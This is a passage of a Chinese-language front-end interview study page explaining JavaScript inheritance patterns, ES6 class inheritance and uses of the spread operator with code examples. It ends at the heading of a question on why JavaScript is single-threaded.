<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"parent"</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayHi</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>
<span class="token class-name">Child</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>child<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
child<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原理：子类实例child的<code>__proto__</code>指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的<code>__proto__</code>指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法<br>优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性<br>缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
a<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ['a','b']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>构造函数继承</p>
<p>实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">printName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">Parent</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Parent.apply(this, arguments);</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token string">"jin"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
child<span class="token punctuation">.</span><span class="token function">printName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// jin</span>
child<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性<br>优点：可解决原型链继承的缺点<br>缺点：不可继承父类的原型链方法，构造函数不可复用</p>
</li>
<li><p>组合继承</p>
<p>原理：综合使用构造函数继承和原型链继承</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">printName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">Parent</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Parent.apply(this, arguments);</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Child</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token string">"jin"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
child<span class="token punctuation">.</span><span class="token function">printName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// jin</span>
child<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// jin</span>

<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
a<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ['a']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的<br>缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数</p>
</li>
<li><p>原型式继承</p>
<p>原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的<code>__proto__</code>指向父对象</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> parent <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">names</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">function</span> <span class="token constant">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token class-name">F</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> object<span class="token punctuation">;</span>    
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> child <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>缺点：共享引用类型</p>
</li>
<li><p>寄生式继承</p>
<p>原理：二次封装原型式继承，并拓展</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">createObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
  o<span class="token punctuation">.</span><span class="token function-variable function">getNames</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>names<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>names<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> o<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>优点：可添加新的属性和方法</p>
</li>
<li><p>寄生组合式继承</p>
<p>原理：改进组合继承，利用寄生式继承的思想继承原型</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">inheritPrototype</span><span class="token punctuation">(</span><span class="token parameter">subClass<span class="token punctuation">,</span> superClass</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 复制一份父类的原型</span>
  <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>superClass<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 修正构造函数</span>
  p<span class="token punctuation">.</span>constructor <span class="token operator">=</span> subClass<span class="token punctuation">;</span>
  <span class="token comment">// 设置子类原型</span>
  subClass<span class="token punctuation">.</span>prototype <span class="token operator">=</span> p<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">printName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">Parent</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Parent.apply(this, arguments);</span>
<span class="token punctuation">&#125;</span>
<span class="token function">inheritPrototype</span><span class="token punctuation">(</span>Child<span class="token punctuation">,</span> Parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f.png"></p>
<h3 id="38、ES6继承"><a href="#38、ES6继承" class="headerlink" title="38、ES6继承"></a>38、ES6继承</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">&#123;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"kif"</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">Parent</span> <span class="token punctuation">&#123;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f11.png"></p>
<h3 id="39、扩展操作符…"><a href="#39、扩展操作符…" class="headerlink" title="39、扩展操作符…"></a>39、扩展操作符…</h3><p><strong>适用类型</strong>：数组、对象、字符串。</p>
<p>复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。</p>
<p>基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效</p>
<p><strong>扩展运算符的应用场景</strong></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 1、函数调用</span>
<span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">v<span class="token punctuation">,</span> w<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span>
<span class="token function">f</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 123456789</span>

<span class="token comment">//2.往数组里push多个元素</span>
<span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>  
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[0,1,2,3,4,5]</span>
<span class="token comment">//123456</span>

<span class="token comment">//3.替代函数的apply方法</span>
<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span>  
<span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">f</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ES5 的写法</span>
<span class="token function">f</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ES6的写法</span>
<span class="token comment">// 123456</span>

<span class="token comment">//4.求一个数组的最大数简化</span>
Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">//ES5 的写法</span>
Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">//ES6 的写法，等同于Math.max(14, 3, 77)</span>
<span class="token comment">//1234</span>

<span class="token comment">//5.扩展运算符后面可以放表达式</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//['a','b'] </span>
<span class="token comment">//1234</span>

<span class="token comment">//6.与解构赋值结合，用于生成数组</span>
<span class="token keyword">const</span> a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> a2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>a1<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//写法1</span>
<span class="token keyword">const</span> <span class="token punctuation">[</span><span class="token operator">...</span>a2<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">;</span>  <span class="token comment">//写法2</span>
<span class="token keyword">const</span> <span class="token punctuation">[</span>first<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
first  <span class="token comment">//1</span>
rest  <span class="token comment">//[2, 3, 4, 5]</span>

<span class="token keyword">const</span> <span class="token punctuation">[</span>first<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
first  <span class="token comment">//undefined</span>
rest  <span class="token comment">//[]</span>

<span class="token keyword">const</span> <span class="token punctuation">[</span>first<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"foo"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
first  <span class="token comment">//"foo"</span>
rest   <span class="token comment">//[]</span>
<span class="token comment">//1234567891011121314151617</span>

<span class="token comment">//7.合并数组</span>
<span class="token punctuation">[</span><span class="token operator">...</span>arr1<span class="token punctuation">,</span> <span class="token operator">...</span>arr2<span class="token punctuation">,</span> <span class="token operator">...</span>arr3<span class="token punctuation">]</span>  <span class="token comment">//[ 'a', 'b', 'c', 'd', 'e' ]</span>


<span class="token comment">//8.数组的克隆——————————————————————特别注意</span>
<span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arr1<span class="token punctuation">]</span><span class="token punctuation">;</span>
arr1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[0, 1, 2]  </span>

<span class="token comment">/* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */</span>

<span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arr1<span class="token punctuation">]</span><span class="token punctuation">;</span>
arr1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[0, [100,11,111], 2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="40、为什么js是单线程"><a href="#40、为什么js是单线程" class="headerlink" title="40、为什么js是单线程"></a>40、为什么js是单线程</h3><p><strong>参考答案：</strong></p>
